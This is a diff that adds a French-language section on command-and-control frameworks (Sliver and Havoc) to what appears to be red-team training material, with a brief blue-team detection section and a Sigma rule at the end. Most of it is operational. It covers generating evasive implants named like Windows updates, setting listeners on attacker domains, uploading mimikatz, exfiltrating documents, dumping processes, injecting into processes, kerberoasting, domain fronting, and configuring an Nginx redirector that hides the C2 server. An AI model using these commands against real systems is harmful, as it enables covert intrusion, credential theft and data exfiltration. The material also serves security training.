@@ -549,6 +549,336 @@ powershell -enc $encoded
 
 ---
 
+## 6. Command & Control (C2) Frameworks
+
+Les C2 frameworks permettent de gérer les machines compromises de manière centralisée, avec des fonctionnalités avancées de post-exploitation, d'évasion et de pivoting.
+
+### 6.1 Pourquoi un C2 ?
+
+```mermaid
+flowchart LR
+    subgraph attacker["🎯 Attacker"]
+        C2[C2 Server]
+    end
+
+    subgraph targets["🏢 Corporate Network"]
+        T1[Workstation 1]
+        T2[Workstation 2]
+        T3[Server]
+        DC[Domain Controller]
+    end
+
+    C2 <-->|"HTTPS/DNS/SMB"| T1
+    C2 <-->|"Encrypted"| T2
+    T1 -->|"Pivot"| T3
+    T2 -->|"Pivot"| DC
+
+    style C2 fill:#e74c3c,color:#fff
+    style DC fill:#9b59b6,color:#fff
+```
+
+| Fonctionnalité | Description |
+|----------------|-------------|
+| **Gestion centralisée** | Un seul point de contrôle pour tous les implants |
+| **Communications chiffrées** | HTTPS, DNS, SMB named pipes |
+| **Évasion intégrée** | Malleable profiles, sleep jitter, process injection |
+| **Post-exploitation** | Modules intégrés (mimikatz, screenshot, keylogger) |
+| **Pivoting** | Tunnels SOCKS, port forwarding |
+| **Collaboration** | Multi-opérateurs, logs partagés |
+
+### 6.2 Sliver - C2 Open Source Moderne
+
+!!! info "Sliver par BishopFox"
+    [Sliver](https://github.com/BishopFox/sliver) est un C2 framework open-source moderne, écrit en Go, avec support multi-plateformes.
+
+**Installation :**
+
+```bash
+# Installation rapide (Linux)
+curl https://sliver.sh/install | sudo bash
+
+# Ou avec Docker
+docker run -it -v ~/.sliver:/root/.sliver bishopfox/sliver
+
+# Démarrer le serveur
+sliver-server
+```
+
+**Génération d'implants :**
+
+```bash
+# Implant interactif (session)
+sliver > generate --mtls 192.168.56.100 --os windows --arch amd64 --save /tmp/
+
+# Implant beacon (asynchrone)
+sliver > generate beacon --mtls 192.168.56.100 --os windows --seconds 60 --jitter 30 --save /tmp/
+
+# Implant avec évasion
+sliver > generate --mtls 192.168.56.100 --os windows --evasion
+
+# Options avancées
+sliver > generate --mtls 192.168.56.100 \
+    --os windows \
+    --arch amd64 \
+    --format exe \
+    --name windows-update \
+    --debug
+```
+
+**Configuration des listeners :**
+
+```bash
+# Listener MTLS (recommandé)
+sliver > mtls --lhost 0.0.0.0 --lport 8888
+
+# Listener HTTPS
+sliver > https --domain legit-domain.com --lport 443
+
+# Listener DNS (plus discret)
+sliver > dns --domains c2.attacker.com --no-response
+
+# Listener sur named pipe (pivoting)
+sliver > pivots named-pipe --bind \\.\\pipe\\slack_rpc
+```
+
+**Post-exploitation avec Sliver :**
+
+```bash
+# Lister les sessions/beacons actifs
+sliver > sessions
+sliver > beacons
+
+# Interagir avec une session
+sliver > use [SESSION_ID]
+
+# Commandes de base
+sliver (WINDOWS-PC) > whoami
+sliver (WINDOWS-PC) > pwd
+sliver (WINDOWS-PC) > ls
+sliver (WINDOWS-PC) > cat C:\\Users\\admin\\Desktop\\flag.txt
+
+# Upload/Download
+sliver (WINDOWS-PC) > upload /tmp/mimikatz.exe C:\\temp\\mimi.exe
+sliver (WINDOWS-PC) > download C:\\Users\\admin\\Documents\\secret.docx
+
+# Exécuter des commandes
+sliver (WINDOWS-PC) > execute -o -- cmd.exe /c "net user"
+sliver (WINDOWS-PC) > shell  # Interactive shell
+
+# Screenshot
+sliver (WINDOWS-PC) > screenshot
+
+# Process listing
+sliver (WINDOWS-PC) > ps
+sliver (WINDOWS-PC) > procdump -p 1234 -s /tmp/dump.dmp
+
+# Injection de processus
+sliver (WINDOWS-PC) > migrate -p 4567  # PID of target process
+
+# Pivoting SOCKS5
+sliver (WINDOWS-PC) > socks5 start
+# Utiliser proxychains avec 127.0.0.1:1080
+```
+
+**Extensions Sliver (BOF/COFF) :**
+
+```bash
+# Charger des extensions
+sliver > armory install rubeus
+sliver > armory install seatbelt
+sliver > armory install sharpwmi
+
+# Utiliser les extensions
+sliver (WINDOWS-PC) > rubeus kerberoast
+sliver (WINDOWS-PC) > seatbelt -- -group=all
+```
+
+### 6.3 Havoc - C2 Moderne avec UI
+
+!!! info "Havoc Framework"
+    [Havoc](https://github.com/HavocFramework/Havoc) est un C2 moderne avec interface graphique Qt, inspiré de Cobalt Strike mais open-source.
+
+**Installation :**
+
+```bash
+# Cloner le repo
+git clone https://github.com/HavocFramework/Havoc.git
+cd Havoc
+
+# Build le teamserver
+cd teamserver
+go build -o havoc-teamserver cmd/server/main.go
+
+# Build le client
+cd ../client
+make
+
+# Configuration
+cat > profiles/havoc.yaotl << 'EOF'
+Teamserver {
+    Host = "0.0.0.0"
+    Port = 40056
+
+    Build {
+        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
+        Nasm = "/usr/bin/nasm"
+    }
+}
+
+Operators {
+    user "hacker" {
+        Password = "SuperSecure123!"
+    }
+}
+
+Listeners {
+    Http {
+        Name         = "HTTP Listener"
+        Hosts        = ["192.168.56.100"]
+        HostBind     = "0.0.0.0"
+        PortBind     = 80
+        PortConn     = 80
+        Secure       = false
+        UserAgent    = "Mozilla/5.0 (Windows NT 10.0; Win64)"
+    }
+}
+EOF
+
+# Démarrer
+./havoc-teamserver --profile profiles/havoc.yaotl
+./havoc-client
+```
+
+**Fonctionnalités principales :**
+
+| Feature | Description |
+|---------|-------------|
+| **Demon Agent** | Implant optimisé avec évasion intégrée |
+| **Sleep Obfuscation** | Chiffrement en mémoire pendant le sleep |
+| **Indirect Syscalls** | Évite les hooks EDR |
+| **BOF Support** | Beacon Object Files compatibles |
+| **Interactive UI** | Interface graphique complète |
+| **Token Manipulation** | Impersonation intégrée |
+
+**Génération d'agents Demon :**
+
+```
+# Via l'interface graphique:
+1. Attack > Payload > Demon
+2. Configurer :
+   - Listener: HTTP Listener
+   - Format: Windows Exe
+   - Arch: x64
+   - Indirect Syscalls: Enabled
+   - Sleep Technique: Obfuscate
+3. Generate
+```
+
+### 6.4 Comparatif des C2
+
+| Feature | Sliver | Havoc | Cobalt Strike | Mythic |
+|---------|--------|-------|---------------|--------|
+| **Open Source** | ✅ | ✅ | ❌ ($5,900/an) | ✅ |
+| **Interface** | CLI | GUI | GUI | Web |
+| **Langage** | Go | C/C++ | Java | Python/Go |
+| **Multi-OS** | ✅ | Windows focus | ✅ | ✅ |
+| **DNS C2** | ✅ | ❌ | ✅ | ✅ |
+| **BOF/COFF** | ✅ | ✅ | ✅ | Via plugins |
+| **Sleep Evasion** | Basic | Advanced | Advanced | Varies |
+| **Documentation** | Excellent | Good | Excellent | Good |
+| **Communauté** | Active | Growing | Large | Active |
+
+### 6.5 OpSec C2 - Bonnes Pratiques
+
+!!! danger "Règles d'OpSec pour les C2"
+
+    1. **Redirecteurs** : Ne jamais exposer le C2 directement
+    2. **Chiffrement** : Toujours utiliser TLS/HTTPS
+    3. **Domain Fronting** : Utiliser des CDN pour masquer le trafic
+    4. **Jitter** : Randomiser les intervalles de beacon
+    5. **Sleep Long** : Préférer des intervalles longs (>30 min) en production
+    6. **Process Injection** : Migrer vers des processus légitimes
+    7. **Named Pipes** : Utiliser pour le mouvement latéral interne
+
+**Architecture avec redirecteur :**
+
+```mermaid
+flowchart LR
+    subgraph internet["Internet"]
+        Victim[Victim]
+        Redirector[Redirecteur<br/>Nginx/Apache]
+    end
+
+    subgraph infra["Infrastructure Attaquant"]
+        C2[C2 Server]
+    end
+
+    Victim -->|"HTTPS"| Redirector
+    Redirector -->|"Proxy Pass"| C2
+
+    style Victim fill:#3498db,color:#fff
+    style Redirector fill:#f39c12,color:#fff
+    style C2 fill:#e74c3c,color:#fff
+```
+
+**Configuration Nginx redirecteur :**
+
+```nginx
+# /etc/nginx/sites-available/c2-redirector
+server {
+    listen 443 ssl;
+    server_name legit-domain.com;
+
+    ssl_certificate /etc/ssl/certs/fullchain.pem;
+    ssl_certificate_key /etc/ssl/private/privkey.pem;
+
+    # Uniquement si User-Agent attendu
+    location / {
+        if ($http_user_agent !~ "Mozilla/5.0.*Windows NT 10.0") {
+            return 404;
+        }
+
+        proxy_pass https://c2-internal.attacker.local:8443;
+        proxy_ssl_verify off;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+    }
+}
+```
+
+### 6.6 Détection des C2
+
+Pour la Blue Team, voici les indicateurs de compromission courants :
+
+| Indicateur | Description | Détection |
+|------------|-------------|-----------|
+| **Beaconing** | Communications régulières | Analyse statistique du trafic |
+| **DNS anormal** | TXT records, subdomains longs | Logs DNS, volume inhabituel |
+| **Named Pipes** | Pipes avec noms suspects | Sysmon Event ID 17/18 |
+| **Process Injection** | CreateRemoteThread | Sysmon Event ID 8 |
+| **Parent/Child anormal** | Word → PowerShell | Process tree analysis |
+
+```yaml
+# Sigma rule - Sliver default beacon
+title: Potential Sliver C2 Beacon Detected
+status: experimental
+logsource:
+    category: proxy
+detection:
+    selection:
+        cs-method: POST
+        cs-uri-stem|contains:
+            - '/api/v1/'
+            - '/oauth/'
+            - '/auth/'
+        cs-bytes|gte: 1000
+    timeframe: 5m
+    condition: selection | count() > 10
+level: high
+```
+
+---
+
 ## Exercice Pratique
 
 !!! example "Exercice : Persistence et Évasion"
